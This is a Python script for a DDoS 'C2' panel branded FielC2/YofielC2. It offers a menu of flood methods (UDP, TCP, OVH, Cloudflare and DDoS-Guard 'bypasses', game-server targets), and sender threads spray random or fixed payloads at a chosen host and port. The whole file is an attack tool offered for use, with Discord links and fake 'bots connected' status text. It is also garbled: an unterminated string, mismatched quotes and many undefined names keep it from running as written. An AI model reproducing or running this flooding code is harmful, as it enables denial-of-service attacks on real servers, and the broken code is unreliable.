#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os
import urllib
import json

prot = (random.randint(9,14))
sys.stdout.write("\x1b]2;[-] FielC2 | Online User : [{}] | Running Attack [5] | Bot Connected [89] | Admin : [Yofiel] | Username : admin\x07".format (prot))

os.system("clear")
print("""\033[93m
 █████                          ███               
░░███                          ░░░                
 ░███         ██████   ███████ ████  ████████     
 ░███        ███░░███ ███░░███░░███ ░░███░░███    
 ░███       ░███ ░███░███ ░███ ░███  ░███ ░███    
 ░███      █░███ ░███░███ ░███ ░███  ░███ ░███    
 ███████████░░██████ ░░███████ █████ ████ █████   
░░░░░░░░░░░  ░░░░░░   ░░░░░███░░░░░ ░░░░ ░░░░░    
                      ███ ░███                    
                     ░░██████                     
                      ░░░░░░  
             \033[93m>> \033[96mFielC2 Private Tools By Yofiel \033[93m<< 
            \033[97m
   ███                                                                                
  █   █
\033[97m  █   █                      \033[93m 
\033[97m█████████               ██   \033[93m
\033[97m█████████              █  █  \033[93m \033[97m
\033[97m███   ███ ██████████████  █      
\033[97m████ ████ █ █          █  █
\033[97m█████████               ██     \033[33m      
   
''')
time.sleep(3.9)
os.system("clear")
print("Connecting To Server [\033[97m••\033[92m]")
time.sleep(0.9)

os.system("clear")
print("Connecting To Server [\033[97m•\033[92m]")
time.sleep(0.9)


methods = """

             HOME METHODS     SERVER       BYPASSES      BYPASSES
            ╔════════════╗╔════════════╗╔════════════╗╔════════════╗
            ║ HOME       ║║ OVH        ║║ UDPBYPASS  ║║ FIVEM      ║
            ║ XXXX       ║║ OVHKILL    ║║ DDOS-GUARD ║║ XXXXXX     ║
            ║ XXXXXX     ║║ OVHDOWN    ║║ XXXXXXXX   ║║ ROBLOX     ║
            ╚════════════╝╚════════════╝╚════════════╝╚════════════╝
               BYPASSES      SERVER        SERVER         LAYER7
            ╔════════════╗╔════════════╗╔════════════╗╔════════════╗
            ║ CFB        ║║ NFO-NULL   ║║ SYN        ║║ HTTPS      ║
            ║ HTTP       ║║ KILLALL    ║║ UDP-DOWN   ║║ STRESSTER  ║
            ║ HOME       ║║ HYDRA      ║║ XXXXXXXXX  ║║ HTTP-CLD   ║
            ╚════════════╝╚════════════╝╚════════════╝╚════════════╝
               BYPASSES      SERVER        SERVER          VIP
            ╔════════════╗╔════════════╗╔════════════╗╔════════════╗
            ║ XXXXXXXXX  ║║ XXXXXXXXX  ║║ CF         ║║ OVH        ║
            ║ XXXXXXXXX  ║║ XXXXXXXXX  ║║ HTTPS-STM  ║║ XXXXXX 
            ║ XXXXXXXXX  ║║ HOME       ║║ CFB        ║║ XXXXXX     ║
            ╚════════════╝╚════════════╝╚════════════╝╚════════════╝

"""

ticket = """
\033[96m For Ticket You Can Join Our Discord Server. https://dsc.gg/hxd-cm
"""

banner =  """
\033[93m
───▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄───   Welcome! to YofielC2 
───█▒▒░░░░░░░░░▒▒█───   Use "help" For Help Command
────█░░█░░░░░█░░█────   Join Our Discord https://discord.gg/gamersource
─▄▄──█░░░▀█▀░░░█──▄▄─   Made By : Yofiel
█░░█─▀▄░░░░░░░▄▀─█░░█
█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
█░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
█░░║║║╠─║─║─║║║║║╠─░░█
█░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█
█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
"""
attacked =  """\033[97m[INFO] Attack Was Success!!"""

helpservice = """
\033[0;93m            ╔══════════════════════════╦═══════════════════════╗
\033[0;93m            ║                    HELP COMMAND                  ║
\033[0;93m            ╚═╦═══════════════════════╦╩╦════════════════════╦═╝
\033[0;93m             ╔╩═══════════════════════╩═╩════════════════════╩╗
\033[0;93m             ║ \033[33m - ticket                                      \033[0;93m║
\033[0;93m             ║ \033[33m - plant                                       \033[0;93m║
\033[0;93m             ║ \033[33m - udpbypass [ip] [time] [port]                \033[0;93m║
\033[0;93m             ║ \033[33m - Layer7 [COMING SOON]                        \033[0;93m║    
\033[0;93m             ║ \033[33m - Layer4 [COMING SOON]                        \033[0;93m║                     
\033[0;93m             ║ \033[33m - methods                                     \033[0;93m║
\033[0;93m             ╚╦══════════════════════════════════════════════╦╝
\033[0;93m              ║\033[93m       \033[93mEXAMPLE \033[33m[methods] 8.8.8.8 60 80        \033[0;93m║
\033[0;93m              ╚══════════════════════════════════════════════╝\033[0;93m
"""


cooldown = """
\033[0;96m      
\033[0;96m                               LOADING FOR MINUTES       
\033[0;96m                              
\033[0;96m =============Akashv CREATED THIS DDOS======================"""
invalid = """\033[0;96mInvalid\033[0;93mCommands"""
cookie = open(".sinfull_cookie","w+")


plant = """
\033[0;35m VIP = TRUE
\033[0;35m USERNAME = admin                
\033[0;35m ADMIN = TRUE
\033[0;35m EXPIRED TIME = NEVER
\033[0;35m API ACCESS = TRUE

send6 = """
     _.-^^---....,,--       
 _--                  --_  
<                        >)
|                         | 
 \._                   _./  
    ```--. . , ; .--'''       
          | |   |             
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 __________.,-#%&$@%#&#~,._______________
"""

fsubs = True
tpings = True
pscans = True
liips = True
tattacks = True
uaid = True
said = True
running = True
iaid = True
haid = True
aid = True
attack = True
ldap = True
http = True
atks = True

def randsender(host, timer, port, punch):
    global iaid
    global aid
    global tattacks
    global running

    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

    iaid += 1
    aid += 1
    tattacks += 1
    running += 1
    while time.time() < timeout and ldap and attack:
        sock.sendto(punch, (host, int(port)))
    running -= 1
    iaid -= 1
    aid -= 1
              
              


def stdsender(host, port, timer, payload):
    global atks
    global running

    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
    atks -= 1
    running -= 1

def main():
    global fsubs
    global tpings
    global pscans
    global liips
    global tattacks
    global uaid
    global running
    global atk
    global ldap
    global said
    global iaid
    global haid
    global aid
    global attack
    global dp

    while True:
        powerran = (random.randint(5,16))
        sys.stdout.write("\x1b]2;[-]ViperC2 | Online User : [{}] | Running Attack [6] | Bot Connected [89] | Admin : [ItzSeven] | Backup Server : [2] | Username : admin\x07".format (powerran))
        sin = input("\033[95m[\033[97madmin@Viper\033[95m]\033[37m >> \033[92m".format(nicknm)).lower()
        sinput = sin.split(" ")[0]

        if sinput == "clear":
            os.system ("clear")
            print (banner)
            main()
        if sinput == "methods":
            os.system ("clear")
            print (wait)
            time.sleep(2)
            os.system ("clear")
            print (wait2)
            time.sleep(2)
            os.system ("clear")
            print (wait3)
            time.sleep(2)
            os.system ("clear")
            print (wait4)
            time.sleep(2)
            os.system("clear")
            print (methods)
            main()
        if sinput == "method":
            os.system ("clear")
            print (wait)
            time.sleep(2)
            os.system ("clear")
            print (wait2)
            time.sleep(2)
            os.system ("clear")
            print (wait3)
            time.sleep(2)
            os.system ("clear")
            print (wait4)
            time.sleep(2)
            os.system("clear")
            print (methods)
            main()
        if sinput == "ticket":
            os.system ("clear")
            print (ticket)
            main()
        if sinput == "clear":
            os.system ("clear")
            print (banner)
            main()
        elif sinput == "?":
            os.system ("clear")
            print (banner)
            main()
        elif sinput == "help":
            os.system('clear')
            print (loading)
            time.sleep(2)
            os.system('clear')
            print (loading2)
            time.sleep(2)
            os.system('clear')
            print (loading3)
            time.sleep(2)
            os.system ('clear')
            print (helpservice)
            main()
        elif sinput == "":
            print(invalid)
            main()
        if sinput == "plant":
            os.system ("clear")
            print (welcome)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome2)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome3)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome4)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome5)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome2)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome3)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome4)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome5)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome2)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome3)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome4)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome5)
            time.sleep(0.1)
            os.system ("clear")
            print (plant)
            main()
        elif sinput == "leave":
            os.system("clear")
            print(send1)
            time.sleep(0.9)
            os.system("clear")
            print(send2)
            time.sleep(0.9)
            os.system("clear")
            print(send3)
            time.sleep(0.9)
            os.system("clear")
            print(send4)
            time.sleep(0.9)
            os.system("clear")
            print(send5)
            time.sleep(0.9)
            os.system("clear")
            print(send6)
            time.sleep(0.9)
           
            os.system ("clear")
            exit()
    

        elif sinput == "udp":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 811
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)                    
                    print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "udpbypass":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 65500
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)                    
                    print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "tcp":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 20179
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)                    
                    print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "cf":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 65500
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)                    
                    print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "ovh":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                        sinput, host, timer, port = sin.split(" ")
                        socket.gethostbyname(host)
                        payload = b"\x00\x02\x00\x2f"
                        threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                        os.system("clear")
                        print(start)
                        time.sleep(1)
                        os.system("clear")
                        print(start2)
                        time.sleep(1)
                        os.system("clear")
                        print(start3)
                        time.sleep(1)
                        os.system("clear")
                        print(start4)
                        time.sleep(1)
                        os.system("clear")
                        print(start5)
                        time.sleep(1)
                        os.system("clear")
                        print(start6)
                        time.sleep(1)
                        os.system("clear")
                        print(start7)
                        time.sleep(1)
                        os.system("clear")
                        print(start8)
                        time.sleep(1)
                        os.system("clear")
                        print(start9)
                        time.sleep(1)
                        os.system("clear")
                        print(start10)
                        time.sleep(1)                    
                        print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "cfb":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 65500
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)                 
                    print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "ovhkill":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                    threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()               
                    print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "ovhdown":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                    threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                    print(attacked)
            except ValueError:
                main()
            except socket.gaierror:
                main()
        elif sinput == "http":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 65500
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)
                    os.system("clear")                    
                    print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "home":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 6048
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)
                    os.system("clear")                    
                    print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "stresster":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 9999
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()

                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)                 
                    print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "http-stm":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 65500
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()

                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)                 
                    print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "http-cld":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 65500
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()

                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)                 
                    print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "ddos-guard":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 65500
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()

                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)                 
                    print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "udp-down":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 1021
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)                    
                    print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "udp-kill":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 666
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)                    
                    print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "tcp-down":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 102400
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)                    
                    print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "udp-samp":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 818
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)                    
                    print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()


try:
    clear = "clear"
    os.system("clear")
    print(banner)
    main()
except KeyboardInterrupt:
    exit()

           
                
                    
       

















